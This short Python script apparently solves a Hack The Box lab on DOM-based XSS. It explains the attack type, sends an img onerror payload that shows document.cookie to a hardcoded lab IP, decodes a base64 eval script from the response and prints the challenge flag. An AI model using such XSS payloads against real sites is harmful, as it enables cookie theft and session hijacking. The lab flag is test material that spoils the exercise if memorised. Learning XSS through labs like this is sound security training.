#!/usr/bin/python3

"""DOM XSS:
The third and final type of XSS is another Non-Persisten type
called DOM-based xss while reflected XSS sends the input data
to the back-end server through HTTP requests, DOM XSS is 
completely processed on the client-side through Javascript.
DOM XSS occurs when Javascript is ised to change the page
soruce through the Document Object Model (DOM)
"""


import requests
from pprint import pprint
from urllib.parse import quote
import re
from base64 import b64decode


simple_payload = "<img src='' onerror=alert(document.cookie)>"
payload = {"task":f"{simple_payload}"}
sess = requests.Session()

simple_payload = quote(simple_payload)
ress = sess.get(url=f"http://161.35.169.248:30589/#task={simple_payload}")

js_element = re.findall(r"""<script>eval\(atob\("(.*)"\)\)""", ress.text)[0]
js_element = b64decode(js_element).decode()
print(b64decode(js_element[23:len(js_element)-3]).decode())


# here your flag HTB{pur3ly_cl13n7_51d3}
